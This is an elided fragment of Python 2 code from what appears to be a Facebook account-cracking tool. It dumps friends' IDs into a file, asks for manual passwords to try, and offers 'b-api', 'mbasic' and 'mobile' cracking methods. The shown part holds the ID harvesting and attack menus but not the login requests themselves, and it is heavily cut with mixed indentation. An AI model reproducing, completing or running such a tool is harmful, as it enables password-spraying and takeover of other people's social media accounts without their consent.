...
def publik(romz,headers=header):
    ...
    try:
    	os.system('clear');banner()
    	print ("%s [%s!%s] Type '%sme%s' Dump Friends list "%(P,M,P,H,P))
        print("\033[1;97m-------------------------------------------------")
        ...
        for a in z['friends']['data']:
            ...
            print '\r%s [*] Collect IDs ➤%s %s ' % (P,H,str(len(id))),
...
class ngentod:
    ...
    def romiy(self):
        try:
            self.apk = raw_input(' %s[?] file dump :%s '%(P,K))
            self.id = open(self.apk).read().splitlines()
            print '%s [%s*%s] Total IDs : %s%s' %(P,K,P,H,len(self.id))
            print("\033[1;97m-------------------------------------------------")
        except:
            print '\n%s [!] The dump file does not exist, the dump id used to be kentod'%(M)
            raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
            print("\033[1;97m-------------------------------------------------")
        unikers = raw_input('%s [?] want to use manual password? [y/t] :%s '%(P,K))
        if unikers in ('Y', 'y'):
            ...
            while True:
                ...
                if pwx == '':
                    ...
                    def zona(zafi_=None): 
                    	print("\033[1;97m-------------------------------------------------")
                        ind = raw_input(' %s[?] methode ➤ \x1b[1;32m'%(P,K))
                        print("\033[1;97m-------------------------------------------------")
                        if ind == '':
                            ...
                            print("\033[1;97m-------------------------------------------------")
                    print ' [%s01%s] methode b-api (fast crack)'%(K,P)
                    print ' [%s02%s] methode mbasic (slow crack)'%(K,P)
                    print ' [%s03%s] methode mobile (very slow crack)'%(K,P)
                    print("\033[1;97m-------------------------------------------------")
                    zona(pwx.split(','))
                    break
        elif unikers in ('T', 't'):
